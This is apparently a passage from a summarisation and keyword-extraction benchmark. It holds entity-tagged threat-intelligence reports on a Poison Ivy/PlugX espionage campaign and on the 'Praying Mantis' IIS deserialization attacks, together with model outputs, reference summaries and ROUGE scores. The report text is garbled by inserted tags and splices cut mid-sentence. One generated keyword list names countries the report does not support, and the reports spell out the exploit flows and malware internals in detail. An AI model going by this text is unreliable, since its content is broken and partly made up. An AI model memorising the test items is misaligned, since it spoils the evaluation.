directly correlates with the [ORDINAL] first submission time of the sample . The [ORG] Passive [ORG] Total heat map ( shown below ) tells us there were almost no active resolutions for this host from [DATE] February until [DATE] late [DATE] July suggesting that the adversary may have observed the submission and deactivated [ORG] DNS for the host on or [DATE] around [DATE] January [DATE] 19 . ( Unfortunately , [DATE] the [DATE] 12 [DATE] day gap [DATE] between [DATE] January [DATE] 19 and [DATE] the [DATE] beginning [DATE] of [DATE] February is an additional hosts ( which also use DDNS domains):www.yahoo.4pu.com www.google.zzux.com www.winupdate.ddns.ms freemoney.ignorelist.com www.micrsoft.ddns.ms office.onmypc.org www.office.onmypc.org abcdollar.mooo.comBoth winupdate[.]ddns[.]ms and www[.]micrsoft[.]ddns[.]ms are undoubtedly attempting to resemble legitimate Windows and [ORG] Microsoft sites , respectively . However , it is unknown if any of theseurl Analysis : Poison Ivy and Links to an Extended PlugX Campaign \u2013 CYINT Analysishosts are related to the actors who created getstrings[.]jumpingcrab[.]com . [PERSON] Related [PERSON] Threat [PERSON] ActivityThere are several documents that appear to target victims interested in [NORP] Chinese affairs , attempt to install the [LOC] PlugX malware ( aka [PERSON] Korplug , [ORG] SOGU ) , and communicate to [CARDINAL] two of the above identified [ORG] IP addresses [ORG] RAT commonly linked to [NORP] Chinese threat actors . Below are the documents and their relevant metadata ( some details were not available).CHINA NEWS BRIEF [CARDINAL] 09 of 2015.doc [ORG] Create Time / Date : We d Sep 3 [TIME] 02:25:00 [DATE] 2014 [ORDINAL] First submission [DATE] 2015 - 01 - 30 04:44:34 [ORG] UTC ( [DATE] 6 [DATE] months , [DATE] 1 [DATE] week [DATE] ago ) [PERSON] Create Time / Date : Fri Jan 30 [TIME] 02:41:00 [DATE] 2015 [ORDINAL] First submission [DATE] 2015 - 02 - 01 09:49:08 [ORG] UTC ( [DATE] 6 [DATE] months , [DATE] 1 [DATE] week [DATE] ago ) Title : Suggested Invitees for Ambassador [PERSON] Create Time / Date : Mon Jul 19 [TIME] 07:59:00 [DATE] 2010 and [ORG] Draft contract [ORG] CMS [ORG] Trg [ORG] System.doc ) exploit CVE-2012 - 0158 to install [LOC] PlugX ( aka [ORG] Korplug / [ORG] SOGU ) , which then calls pointed to in [DATE] January . The \u201c [WORK_OF_ART] China [WORK_OF_ART] News [WORK_OF_ART] Brief \u201d document is shown below . I have not yet concluded what the contents of SHA1 document contact list.doc ( shown below ) also installs PlugX identified in a [DATE] June [DATE] 2105 Citizen Lab post about attacks on the [NORP] Tibetan diaspora in [GPE] Hong [GPE] Kong . ( I hope to explore this connection in greater details in a follow - on post.)url Analysis : Poison Ivy and Links to an Extended PlugX Campaign \u2013 CYINT AnalysisInterestingly , both CHINA NEWS BRIEF [CARDINAL] 09 of 2015.doc and [ORG] Draft contract [ORG] CMS [ORG] Trg [ORG] System.doc are mentioned in a [DATE] February [DATE] 2015 SOPHOS report . The report discusses PlugX attacks on a variety of targets including those on [GPE] India . The attacks reportedly took place [DATE] between [DATE] September [DATE] 2014 and [DATE] February [DATE] 2015 . Our PIVY sample was compiled on [DATE] September 14 , [DATE] 2014 and submitted to [ORG] Virus [ORG] Total on [DATE] January [DATE] 19 , 2015.In addition to the infrastructure overlap , this correlation in timing also suggests that the [ORG] Poison Ivy sample was just [CARDINAL] one payload involved in a much broader , 5 - [DATE] 6 [DATE] month campaign targeting [GPE] India , the [NORP] Tibetan community , and likely others of interest to [GPE] China . According to the SOPHOS report : Not surprisingly , just like with several other campaigns , in this case it was observed that different malware families were distributed using similar carrier documents\u037e only the encrypted payload was replaced at the end of the file . The shellcode used in the carrier was very convenient for this purpose : the length and location of the final payload was stored at the end of the file . It was possible to swap the payload without needing to modify the exploit condition and the shellcode itself.url Analysis : Poison Ivy and Links to an Extended PlugX Campaign \u2013 CYINT AnalysisThus , our [ORG] Poison Ivy sample in this case appears to be tied to extensive attacks by [CARDINAL] one or more adversaries acting on behalf of [NORP] Chinese interests.[1 ] For example , by [ORG] FireEye , [ORG] Conix [ORG] Security , and [ORG] Trend [ORG] Micro.\uf300 [ORG] Tell me what you think!RELATED CONTENT BY TAGANALYSISCHINAMALWAREPLUGXPOISONIVYIndependent Publisher empowered by [NORP] WordPressurl", "generated_text": "Japan CERT; a new Poison Ivy RAT; use; 2005; Chinese interests; addition; HTTP POST requests; proxy authentication; control; servers; 2016; Russian; China; activities; the campaign; Indian; Tibetan; other targets; September 2014; February 2015; India; Tibet; the malware; threat analysis; the attackers; a nexus; Egypt; Myanmar; Russia; the campaign; IP addresses; infrastructure; the Maltego graph; the Poison Ivy sample; indicators; compromise; compromise; cybercrime; compromise.", "ref_text": "<START-1>The report by CYINT Analysis examines a new variant of the Poison Ivy remote access trojan (RAT) identified by Japan CERT in September 2014. The Poison Ivy sample uses updated command and control capabilities and the domain getstrings[.]jumpingcrab[.]com, which has resolved to 3 different IP addresses. The report connects this Poison Ivy variant to an extended campaign from September 2014 - February 2015 that distributed PlugX malware using decoy documents targeting India, Tibetan communities, and other parties of interest to China. Some of the decoy documents use the same IP addresses as the Poison Ivy sample. A Sophos report on PlugX mentions attacks on India over the same September 2014 - February 2015 timeframe. The timing and infrastructure overlaps suggest the Poison Ivy sample was part of a broader 5-6 month campaign likely conducted by one or more Chinese state-sponsored groups. The report concludes that while anyone can acquire Poison Ivy, this particular variant appears tied to cyber espionage activity aligned with Chinese intelligence priorities, given the targeting, timing, infrastructure, and connections to PlugX. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5204678362573099, "gpt3/lexical/rouge_rouge2": 0.2, "gpt3/lexical/rouge_rougeL": 0.3157894736842105, "gpt3/lexical/rouge_rougeLsum": 0.3157894736842105, "gpt3_generated_text": ["This article discusses a new variant of the Poison Ivy remote access tool (RAT) that was identified by Japan CERT. The malware, which has been in existence since 2005 and is often associated with actors linked to China, has been updated to include new command and control (C2) functionality. The malware now uses HTTP POST requests and supports proxy authentication to communicate with C2 servers. The article also mentions a campaign that targeted India, the Tibetan community, and other victims between September 2014 and February 2015. The Poison Ivy sample discussed in the article is believed to be part of this broader campaign, indicating that it was likely used by one or more adversaries acting on behalf of Chinese interests. The article provides details about the file and execution of the malware, including its persistence through a scheduled task. Overall, the article highlights the ongoing development and use of the Poison Ivy RAT, as well as the potential involvement of Chinese actors in cyber espionage activities."]}, {"split_name": "val", "sample_id": "val_114", "prompt_text": "Extract the keywords: TG1021 : \u201c [WORK_OF_ART] Praying Mantis \u201d [WORK_OF_ART] DISSECTING [WORK_OF_ART] AN [WORK_OF_ART] ADVANCED MEMORY [WORK_OF_ART] - RESIDENT [WORK_OF_ART] ATTACKJuly 2021Sygnia Incident Response Team Contributors : [PERSON] Noam [PERSON] Lifshitz , [PERSON] Amitai [PERSON] Ben [PERSON] Shushan [PERSON] Ehrlich , [PERSON] Asaf [PERSON] Eitani , [PERSON] Amnon [PERSON] Kushnir , [PERSON] Gil [PERSON] Biton , [PERSON] Martin [PERSON] Korman , Itay Shohat and [PERSON] Arie [PERSON] ZilbersteinOverviewThe Sygnia Incident Response team identified an advanced and persistent threat actor , operating almost completely in - memory . The operators behind the activity targeted Windows internet - facing servers , using mostly deserialization attacks , to load a completely volatile , custom malware platform tailored for the Windows IIS environment . [GPE] Sygnia refers to this threat actor as \u201c Praying Mantis\u201d . During [DATE] the [DATE] past [DATE] year , [ORG] Sygnia \u2019s Incident [ORG] Response team has been responding to a series of targeted cyber intrusion attacks , performed by a highly capable and persistent threat actor \u2013 TG1021 : \u201c Praying Mantis \u201d . These attacks targeted prominent organizations and compromised their networks by exploiting internet facing servers . The initial foothold within a network was obtained by leveraging a variety of deserialization exploits targeting Windows IIS servers and web applications . The activity observed suggests that the threat actor is highly familiar with the Windows IIS platform , and equipped with 0 [DATE] - day exploits . TG1021 utilize a completely volatile and custom malware framework tailor - made for IIS servers . The core component , loaded on to internet facing IIS servers , intercepts and handles any HTTP request received by the server . TG1021 also use an additional stealthy backdoor and several post - exploitations privileges , and move laterally within networks.to perform networkThe nature of the activity and general modus - operandi suggest TG1021 to be an experienced stealthy actor , highly aware of OPSEC ( operations security ) . The malware used by TG1021 shows a significant effort to avoid detection , both by actively interfering with logging mechanisms , successfully evading commercial EDRs and by incoming connections , rather than connecting back to a [CARDINAL] C2 channel and continuously generating traffic . Furthermore , the threat actor actively removed all disk - resident tools after using them , effectively giving up on persistency in exchange for stealth.silently awaitingThe threat actor \u2019s tactics , techniques , and procedures ( TTPs ) strongly correlate with the ones described in an advisory published by [ORG] the [ORG] Australian [ORG] Cyber [ORG] Security [ORG] Centre ( ACSC ) \u2013 \u201c Copy - paste compromises\u201d1 . The advisory , published in [DATE] June [DATE] 2020 , details the activity of a sophisticated state - sponsored actor which represents \u201c the most significant , coordinated cyber - targeting against [NORP] Australian institutions [ORG] the [ORG] Australian [ORG] Government has ever observed . \u201d1 Copy - paste compromises2Table of [ORG] Contents [ORG] Overview [ORG] 2 Windows IIS Server & Web Application Exploits 4 Checkbox Survey RCE Exploit ( CVE-2021 [ORG] - 27852 ) [CARDINAL] 4 VIEWSTATE Deserialization Exploit 5 Altserialization Insecure Deserialization 6 Telerik - UI Exploit ( CVE-2019 [DATE] - 18935 , CVE-2017 [ORG] - 11317 ) [ORG] 7 [ORG] Toolset [ORG] Infrastructure [ORG] & [ORG] IIS [FAC] Platform [FAC] Malware [CARDINAL] 7 NodeIISWeb Malware 8 Hooking Mechanism 9 Payload Search 10 Module Reflective Loading 11 JScript Payload Execution [CARDINAL] 12 Traffic Forwarding 12 NodeIISWeb Reflective Loaders 14 Reflective Loader DLL 14 Loader Web Shell [CARDINAL] 15 [ORG] Second [ORG] Stage [ORG] Malware [ORG] - [ORG] ExtDLL.dll [CARDINAL] 17 Additional [LAW] Modules [LAW] 18 PSRunner.dll [CARDINAL] 18 [ORG] Forward.dll 18 PotatoEx.dll 19 E.dll 19 Post - exploitation Activities [CARDINAL] 19 Credential harvesting [CARDINAL] 19 Reconnaissance 20 Lateral Movement 20 Similarities to the Copy - Paste threat actor [CARDINAL] 20 [ORG] Defending [ORG] Against [ORG] TG1021 Attacks 20 Sealing .NET [ORG] Deserialization [ORG] Exploits [ORG] & [ORG] Best [ORG] Practices [ORG] 21 [ORG] Indicators [ORG] of Compromise [CARDINAL] 22 Files [CARDINAL] 22 Additional IOCs [CARDINAL] 23 MITRE ATT&CK Breakdown [CARDINAL] 243Windows IIS Server & Web Application ExploitsDuring [DATE] the [DATE] past [DATE] year [GPE] Sygnia has been monitoring attacks conducted by TG1021 . The actor leveraged a variety of exploits targeting internet facing servers to gain initial access to target networks . These exploits abuse deserialization mechanisms and known vulnerabilities in web applications and are used to execute a sophisticated memory- resident malware that acts as a backdoor . This malware will be referred to as the \u201c NodeIISWeb \u201d malware . The threat actor uses an arsenal of web application exploits and is an expert in their execution . The swiftness and versatility of operation combined with the sophistication of post - exploitation activities suggest an advanced and highly skillful actor conducted the operations . The following [CARDINAL] four exploits were used by the threat actor to compromise target systems . Checkbox Survey RCE Exploit ( CVE-2021 [ORG] - 27852 ) [CARDINAL] One of the vulnerabilities that the threat actor leveraged to exploit IIS servers is a 0 [DATE] - day vulnerability associated with an insecure implementation of the deserialization mechanism within the \u201c Checkbox Survey \u201d web application , a commercial survey platform . The vulnerability in the \u201c Checkbox Survey \u201d application enables remote code execution ( RCE ) on the target resulting with the initial compromise of an IIS server . Analysis of the activity found the vulnerability resides in an insecure implementation of the VIEWSTATE mechanism in .NET.VIEWSTATE is a mechanism in .NET used to maintain and preserve web page session data between a client and a server . When using this feature any client that browses an application receives a serialized .NET object that contains the values of specific variables . When the client sends an HTTP request back to the web application , the [ORG] VIEWSTATE object is sent along with it , which in turn gets deserialized and processed on the server \u2019s side setting the variables to their previous values . The vulnerability in \u201c [WORK_OF_ART] Checkbox [WORK_OF_ART] Survey \u201d was identified on a specific webpage in the application where the methods originally used to handle the VIEWSTATE mechanism were replaced with an insecure and compressed version called VSTATE . As illustrated in Figure [CARDINAL] 1 , the new \u201c LoadPageStateFromPersistenceMedium \u201d method does not validate the integrity of the data passed in the VSTATE variable , blindly triggering the deserialization process . Sending a crafted VSTATE variable which exploits the \u201c LosFormatter \u201d deserialization process would allow a threat actor to execute code remotely on the [ORG] Checkbox application server . Figure [CARDINAL] 1 : Vulnerable code snippet found within [ORG] Checkbox code22 [ORG] Checkbox source code found on [PERSON] GitHub4The same exact VSTATE implementation was published in a blog post in [DATE] 2005 as a solution for a compressed implementation of VIEWSTATE . Some web applications have copied this piece of code into their own repository , exposing the application to the vulnerability . This topic of VSTATE deserialization exploits was covered in the past by Graa \u2013 Security Blog . The vulnerable piece of code was found in version [CARDINAL] 6 of the \u201c Checkbox Survey \u201d software and is shown in Figure 1.The flow of the VSTATE deserialization exploit used by the threat actor was executed in a single HTTP POST to the [ORG] Checkbox application server , and is illustrated in Figure [CARDINAL] 2 below:1.2.3.The threat actor crafts and sends an [ORG] HTTP [ORG] POST request containing [CARDINAL] two main components \u2013 A crafted VSTATE variable containing a reflective loader [ORG] DLL and a VSTATEGENERATOR variable containing the NodeIISWeb malware . The exploited deserialization process executes the reflective loader [ORG] DLL contained in the VSTATE variable . The reflective loader [ORG] DLL reads , decodes , and decrypts the data passed in the \u201c _ _ VSTATEGENERATOR \u201d [GPE] parameter.4 . Finally , the decrypted data ( the NodeIISWeb malware ) is reflectively loaded and acts as a backdoor on thecompromised asset . Figure [CARDINAL] 2 : Threat actor VSTATE / VIEWSTATE exploit flow . VIEWSTATE Deserialization Exploit The threat actor also leveraged and exploited the standard VIEWSTATE deserialization process to regain access to compromised machines . Newer versions of .NET enforce encryption and validation of the [ORG] VIEWSTATE data and offers protection against this kind of exploit . However , if the encryption and validation keys are stolen or leaked , they can be used to bypass the integrity check mechanism and eventually execute malicious code on the IIS server.5During [CARDINAL] one of [GPE] Sygnia \u2019s investigations , TG1021 leveraged stolen decryption and validation keys to exploit IIS web servers . The flow of the [ORG] VIEWSTATE deserialization exploit is almost identical to the VSTATE exploit explained above , with the adjustment of encrypting and signing the VIEWSTATE data instead of compressing it . This exploit was used several times by the threat actor to regain access to compromised machines , since they rely on a volatile backdoor and tools . Additionally , it was used in order to move laterally between machines in a cluster . This is possible because if a web application is set to run in a cluster , all the instances need to share same secret keys otherwise the [ORG] VIEWSTATE feature would not work . Altserialization Insecure Deserialization The threat actor leveraged a [ORDINAL] second vulnerability involving insecure deserialization to exploit IIS servers . This section describes that process . ASP.NET allows web applications to store user sessions to be used later once the user returns and interacts with the application . This works by saving a serialized .NET session object to a [ORG] MSSQL database and assigning it a unique cookie which is given to the user when browsing the application . Once the user browses again with the cookie the session state is loaded and deserialized . A crafted serialized object which is written to the database could lead to remote code execution on a web application server once the implanted cookie is passed in an HTTP request . This technique was used by TG1021 in order to move laterally between IIS servers within an environment . An initial IIS server was compromised using one of the deserialization vulnerabilities listed above . From there the threat actor was able to conduct reconnaissance activities on a targeted ASP.NET session state [ORG] MSSQL server and execute the exploit , as illustrated below and in Figure [CARDINAL] 3:1 . After gathering information on the environment , a malicious serialized object was written to the [GPE] database.2 . The threat actor sent an HTTP GET request using the crafted ASP.NET session state cookie.3 . The target IIS web server loaded and deserialized the matching session state object correlating to the [PERSON] plantedcookie.4 . The deserialization process is exploited by the crafted object in order to compile an in - memory web shell.5 . Immediately after the web shell was created the threat actor accessed it to reflectively load the [ORG] maliciousNodeIISWeb malware on the compromised asset.6Figure [CARDINAL] 3 : Altserialization exploit attack flowTelerik - UI Exploit ( CVE-2019 [DATE] - 18935 , CVE-2017 [ORG] - 11317 ) Telerik is known for several products providing functionality to web application development . [CARDINAL] One of the products , Telerik UI for ASP.NET AJAX , is a widely used suite of [ORG] UI components for web applications . This product was found to be vulnerable due to weak encryption , enabling a malicious actor to upload a file and/or to run malicious code . The vulnerabilities were used by TG1021 to upload a web shell loader to IIS servers accessible from the internet . The web shell was later used to upload additional modules and was deleted after a short period of time . Subsequent to the initial use , the web shell was uploaded at the beginning of every following wave of threat actor activity . [ORG] Toolset [ORG] Infrastructure [ORG] & [ORG] IIS [ORG] Platform [ORG] MalwareTG1021 uses a custom - made malware framework , built around a common core , tailor - made for IIS servers . The toolset is completely volatile , reflectively loaded into an affected machine \u2019s memory and leaves little - to - no trace on infected targets.7The framework consists of a [CARDINAL] two - stage toolset:1 . The [ORDINAL] first consists of lightweight dynamic loaders in the form of DLLs and web shells , and the core component ( TheNodeIISWeb malware ) . These are the [ORDINAL] first stage tools used on compromised IIS webservers.2 . The [ORDINAL] second stage tools are more generic [PRODUCT] Windows - based tools which consist of a stealthy backdoor and a set ofpost - exploitation modules loaded on demand to extend functionality . Figure [CARDINAL] 4 : Toolset Infrastructure OverviewNodeIISWeb [PERSON] Malware [PERSON] OverviewThe NodeIISWeb malware is a .NET [ORG] DLL reflectively loaded module that is injected into the w3wp.exe process of affected machines . It serves as the core component of the threat actor \u2019s malware framework and acts as the main backdoor on a compromised IIS server . It can operate in [CARDINAL] two different modes:1 . [PERSON] IIS [PERSON] Hooking [PERSON] ModeThe malware hooks native IIS input validation functions in the injected w3wp.exe process , which provides access to all incoming HTTP traffic . The requests are analyzed by the backdoor , allowing the operators to communicate with it by sending crafted HTTP requests to any web page in the process context.82 . Web [PERSON] Shell [PERSON] Controller [PERSON] ModeThe malware is executed and controlled using a custom web shell Loader . By sending specially crafted HTTP requests to the web shell , the operators trigger the execution of the command input function of an instance loaded to a w3wp.exe process . In this mode the NodeIISWeb will execute without hooking the IIS validation functions and can be controlled only through the specific web page where the web shell is located . The NodeIISWeb malware provides the threat actor with [CARDINAL] four different capabilities:1 . Run a set of basic functions - Such as gathering system information or accessing and manipulating the file systemon the machine.2 . [PERSON] Execute [PERSON] JScript payloads on the machine.3 . Dynamically load additional modules.4 . Perform several network related operations , including [ORG] HTTP and [ORG] SQL traffic forwarding and an implementation of a [ORG] TCP client instance . These capabilities enable active command and control of other backdoors deployed within the network as well as control of the extension modules over the machine loopback interface . To make analysis of the module more difficult , NodeIISWeb is protected by a public tool \u201c CofuserCore \u201d which packs and obfuscates the binary . The NodeIISWeb malware bares similarity to the \u201c js_eval \u201d malware family described in the \u201c Copy [WORK_OF_ART] - Paste [WORK_OF_ART] Compromises \u201d ACSC advisory . This will be further discussed in the section \u201c Similarities to the Copy - Paste threat actor\u201d . Hooking Mechanism To establish a command - and - control channel , the malware deploys an inline hook on a validation function within the IIS request handling process . During this process , the malware will first attempt to obtain a pointer to the method \u201c ValidateInputIfRequiredByConfig \u201d , which is a default function used by ASP.NET HTTPRequest class to validate any input within the request , if input validation is enabled in the web page configuration . If a pointer to the method is not found , the malware will attempt to obtain a pointer to another default method called \u201c ValidateInput\u201d . The final stage of the process is then initiated when a hook is performed using the malware \u2019s built - in functionality named \u201c ManagedHook \u201d . The hook swaps between the obtained method pointer and a malicious method created by the threat actor named \u201c _ ValidateInput \u201d . After the malicious method is executed , the \u201c ManagedHook \u201c instance calls the original hooked function . The hooking process is initiated by invoking [CARDINAL] one of the malware \u2019s methods called \u201c [PRODUCT] InitHook \u201d . The method is invoked with an additional string argument ( will be referred to as \u201c HOOK_KEY \u201d ) . The \u201c HOOK_KEY \u201d string is crucial to the malware \u2019s operation , as it is used to search for threat actor payloads within incoming HTTP traffic . A reconstructed version of the \u201c [PRODUCT] InitHook \u201d method code is shown in the following snippet : Figure [CARDINAL] 5 : IIS validation function hooking performed by the \u201c [PRODUCT] InitHook \u201d method , reconstructed by Sygnia9Payload Search The malicious function \u201c _ ValidateInput \u201d is used to process incoming requests , searching for payloads in several locations within the request . The following list describes the search order for payloads:1 . A file larger than 8 bytes which is attached to the request and has a name that matches the \u201c HOOK_KEY\u201d.2 . An [ORG] HTTP [ORG] POST request containing a parameter with a key name that matches the \u201c HOOK_KEY \u201d and value lengthis greater than 8 bytes.3 . An HTTP cookie with a name that matches the \u201c HOOK_KEY \u201d and that its value \u2019s length is over 10 bytes.4 . If no payload was found in the previous steps , the NodeIISWeb will try to treat the whole request content as thepayload . After identifying an incoming payload , the malware attempts to extract [CARDINAL] two variables from it \u2013 A \u201c Command \u201d variable and a \u201c Forward \u201d variable . The parameters are extracted in the following procedure:1 . Key and IV Generation \u2013 A decryption key is generated by calculating the SHA256 value of the payload \u2019s first [CARDINAL] 3 bytes concatenated to the \u201c HOOK_KEY \u201d string value . The malware then calculates the MD5 value of the key , the [CARDINAL] 16 bytes MD5 output is used as the IV for the decryption [PRODUCT] process.2 . Decryption \u2013 The payload ( starting from the [ORDINAL] 3rd byte ) is decrypted with a standard AES algorithm using thegenerated key and IV from the previous step.3 . Decompression \u2013 After decryption , the payload is decompressed recursively using [GPE] GZip . Once the \u201c Command \u201d and \u201c Forward \u201d variables are extracted , they are used by the malware to launch the requested built - in functionality . The [ORDINAL] first byte of the \u201c Command \u201d parameter ( \u201c Command ID \u201d ) is used to determine which built - in function will be executed by the malware . In most cases , the \u201c Forward \u201d data will contain the arguments for the requested function , but in some cases , the selected functionality will not require both variables and only the \u201c Command \u201d variable is resolved . The built - in functionalities of the NodeIISWeb malware can be seen in the following table : Command ID Description 0x00Information gathering - Query domain membership , operation system information , process and owner information of the current process , time zone , network interfaces information and status and drives information . Recursive directory listing . Copying or moving files , or recursively copying directories . files and recursive directories deletion . Directory creation . Custom reflective loading . Traffic forwarding , either HTTP , [ORG] SQL or [ORG] TCP . used to communicate to additional backdoors installed within the network , as well as to memory loaded payloads via loopback communication . Dynamic execution of [PERSON] JScript [PERSON] payloads.0x09 [CARDINAL] C2 communication flow with the backdoor with full built - in capabilities0x01 0x0810Module Reflective Loading One of the malware \u2019s most interesting built - in function capabilities is reflective loading of custom DLLs . In order to reflectively load a payload , the following [CARDINAL] 3 - step procedure is performed using the \u201c Command \u201d and \u201c Forward \u201d variables as arguments:1 . A random port is selected by the malware for future communications with the loaded module . The port \u2019s availability is checked by opening and closing a [ORG] TCP socket over the loopback . After that , a target [ORG] IP address is extracted from the \u201c Command \u201d variable in the format of a [CARDINAL] 32 bit integer . The port and [ORG] IP are concatenated to form a struct which is later passed as an argument to the loaded module . Figure [CARDINAL] 6 : Random port generation before reflective [ORG] DLL loadingA shellcode is extracted from the \u201c Command \u201d variable and loaded to memory . This shellcode reflectively loads a [ORG] DLL passed in the \u201c Forward \u201d variable and returns a pointer to an initial method . If a shellcode and [ORG] DLL were previously loaded , the NodeIISWeb will use the previously exported method unless given a flag which forces a reload and execution of the shellcode and DLL.a . The custom shellcode that performs the necessary operations to enable execution of the loaded [ORG] DLL , forexample relocations within the binary.b . The shellcode returns a pointer to a specific exported function of the [ORG] DLL by comparing the name of the exported function to a hash value embedded within the shellcode . That way the threat actor controls which function is returned by generating a custom shellcode for any needed function.c . If no [ORG] DLL was provided in the \u201c Forward \u201d variable \u2013 the shellcode is simply executed with a null - pointer asargument , allowing execution of generic shellcodes . Figure [CARDINAL] 7 : Reconstructed InitLoader method - Execution of shellcode to reflectively load payload DLL2 . Finally , the exported method is invoked using the structure created in step [CARDINAL] 1 as an argument.11Figure 8 : Reflective loading of payload [ORG] DLL and invocation of the selected functionA sample shellcode was acquired alongside the malicious [ORG] DLL that was loaded using that shellcode . The shellcode which was found is a Position Independent Code ( PIC ) used to reflectively load \u201c ExtDLL.dll \u201d to memory by allocating , writing and relocating any needed addresses to the appropriate allocated address . The exported method returned by the shellcode is a method named \u201c Hello \u201d \u2013 which is the method used to execute the main flow of \u201c [WORK_OF_ART] ExtDLL.dll\u201d . [PERSON] JScript [PERSON] Payload Execution The malware implements code execution by invoking in - memory Jscript code sent to the NodeIISWeb malware . This is done by loading the \u201c [ORG] Microsoft . Jscript . Eval \u201d assembly to the current process and invoking the \u201c JscriptEvaluate \u201d function with the given payload . The malware uses a custom hardcoded template script - block for the Jscript code execution : Figure [CARDINAL] 9 : NodeIISWeb hard coded Jscript evaluation codeFigure [CARDINAL] 10 : Invocation of Jscript evaluation codeThis method of implementation achieves a stealthy remote code execution method by avoiding spawning new process on the machine . Traffic Forwarding The NodeIISWeb malware enables [CARDINAL] three types of traffic forwarding:1 . [ORG] TCP [ORG] Tunneling \u2013 used as a [CARDINAL] C2 channel to other in - memory modules or additional NodeIISWeb instances in an12infected network.2 . HTTP forwarding3 . SQL forwarding Both HTTP and [ORG] SQL traffic forwarding commands are implemented with an additional XML formatted string containing configuration instructions for crafting the relevant traffic . The different XML attributes allow for creation of different HTTP and [ORG] SQL requests . By default , the HTTP method is set to GET , unless additional data is passed to the function through the matching \u201c Data \u201d variable . The following table summarizes each attribute role in an XML describing an HTTP request : [ORG] Description [ORG] Target [ORG] URL [ORG] Windows user impersonation Request timeout Network credentials are to be used [ORG] Domain name ( only applicable if \u201c AT \u201d is defined ) Username ( only applicable if \u201c AT \u201d is defined ) User password ( only applicable if \u201c AT \u201d is defined ) Web proxy is to be used and defined in \u201c AD \u201d attribute Web proxy domain name ( only applicable if \u201c [ORG] PX \u201d and \u201c PU \u201d are defined ) Web proxy username ( only applicable if \u201c [ORG] PX \u201d is defined ) Web proxy password ( only applicable if \u201c [ORG] PX \u201d and \u201c PU \u201d are defined ) Headers to be added to the request [PRODUCT] Header name contained under \u201c H \u201d attributes ( only applicable if \u201c H \u201d defined)XML Attribute A similar XML would be provided to craft an [ORG] SQL query with the following attributes : The functionality of traffic forwarding in the main NodeIISWeb malware is a direct implementation of the \u201c [ORG] Forward.dll \u201d module with additions for the [ORG] SQL traffic . This mechanism of traffic forwarding has some default values which are used in the requests generated . These characteristics , such as a default user - agent , can be used to detect malicious traffic . Description SQL connection string Windows user impersonation [ORG] SQL query [ORG] SQL command timeout13NodeIISWeb Reflective Loaders As a volatile tool , the NodeIISWeb malware is used by the threat actor solely in - memory . To do so , the tool is loaded dynamically into the process memory using one of the following ways:1 . When the threat actor had RCE capabilities on a target IIS server , a [ORG] DLL acting as a dynamic loader was usedas an initial payload for the exploit . This [ORG] DLL in turn dynamically loads the NodeIISWeb malware calling the \u201c [PRODUCT] InitHook \u201d method.2 . When the threat actor only had the ability to upload files to a target IIS server , an NodeIISWeb web shell loaderand controller was deployed . The initial access to this web shell created an NodeIISWeb instance on the machine ( without hooking the IIS validation methods ) , and further access would be made to control the malware . Both loaders are similar to one another in their functionality and basic safety measures , however there is a significant difference in the operational mode and control over the malware . Reflective Loader DLL A lightweight .NET reflective loader designed to load malicious .NET DLLs to the IIS process memory and execute a selected function within it . This [ORG] DLL was used in the VIEWSTATE / VSTATE deserialization exploit workflow to execute the threat actors \u2019 main implant \u2013 the NodeIISWeb malware . In the instances observed , the threat actor invoked the \u201c [PRODUCT] InitHook \u201d method to initialize an NodeIISWeb malware instance and hook HTTP validation functions on the servers . By doing so , the threat actor established the [ORDINAL] first foothold on the target server . The [ORG] DLL does not persist on the victim machine , which means it is uploaded as a payload in every exploit . Once the [ORG] DLL is loaded it checks if the request that it was sent with is above 4096 bytes in size . If so , it searches for the \u201c _ _ VSTATEGENERATOR \" parameter and attempts to decode and decrypt it using a basic XOR operation . The decoded payload consists of [CARDINAL] three main sections:1 . The [ORDINAL] first [CARDINAL] 2 bytes are used in the decryption process as [LAW] XOR [LAW] keys.2 . Bytes [DATE] 2 [DATE] - [DATE] 32 are a string containing the .NET class name , function name within that class and argument supplied tothe function , all separated by pipe characters ( \" |\").3 . The rest of the payload is a .NET [ORG] DLL , containing the said .NET class . The returned response contains the header \" [WORK_OF_ART] Pragma \" with the value \" no - cache \" , signaling a successful execution.14Figure [CARDINAL] 11 : A snippet of code from ReflectiveLoadForms.dllLoader Web Shell On some occasions , TG1021 deployed a web shell on IIS servers for a short period of time . In most cases , these web shells were deleted shortly after they were dropped . The web shell functionality is almost identical to the Reflective Loader DLL , as it used to load binaries and initialize a malware instance from within it , using an almost identical decryption and decoding mechanism:1 . The [ORDINAL] first [CARDINAL] 2 bytes are used in the decryption process as [LAW] XOR [LAW] keys.2 . Bytes [CARDINAL] 2 - 32 represent an array of strings later used for invocation , separated by \u201c |\u201d.3 . All bytes starting from [CARDINAL] 32 are the malicious binary payload.15Figure [CARDINAL] 12 : The NodeIISWeb Loader & Controller web shellThe [ORDINAL] first object in the string array \u201c keys \u201d is placed in the web application HTTP cache under the value \u201c _ [ORG] CAPCACHE__CAPCACHE _ \u201d . When the NodeIISWeb malware instance is initialized without arguments , it looks for the value stored in this key to be used as the \u201c [PRODUCT] HOOK_KEY\u201d . Figure [CARDINAL] 13 : The [PERSON] IISNode class constructorAfter initialization , a pointer to the malware instance is saved in the web application HTTP cache under the key \u201c _ CAPCACHE _ \u201d . When the attacker revisits the specific webpage , the object \u2019s \u201c ToString \u201d method is invoked which in turn initiates the [CARDINAL] C2 logic of the malware . Without knowing what object is stored in the cache under the key \u201c _ CAPCACHE _ \u201d , it might seem as a legitimate comparison between [CARDINAL] two string objects , when really the \u201c ToString\u201d16method triggers the malware commands . In a few cases the threat actor placed the controller in specific locations leveraging default IIS webpage naming . The threat actor would locate a directory in the web application that did not contain a default webpage file and place the controller in that directory using [CARDINAL] one of the default document namings . When the threat actor would request the directory via HTTP without requesting a specific resource , the IIS server would serve the [ORDINAL] first resource matching [CARDINAL] one of the default values . Figure [CARDINAL] 14 : Default IIS configuration for \u201c defaultDocument \u201d filesSecond [ORG] Stage [ORG] Malware [ORG] - [ORG] ExtDLL.dll The threat actor uses a generic [PRODUCT] Windows - based malware for operating on compromised [PRODUCT] Windows machines as a [ORDINAL] second stage for the NodeIISWeb malware . The backdoor uses a passive C2 channel , listening for incoming [ORG] TCP connections , minimizing network traffic when it is not in use . The tool provides backdoor functionality , allowing the threat actor to perform various actions on the affected host , for example:\u2022 File and directory manipulation ( read , write , delete , copy , move)\u2022 [PRODUCT] System information gathering\u2022 Dynamic [ORG] DLL loading and execution\u2022 Code injection , token manipulation and additional common attack technique functionalitiesThe malware also 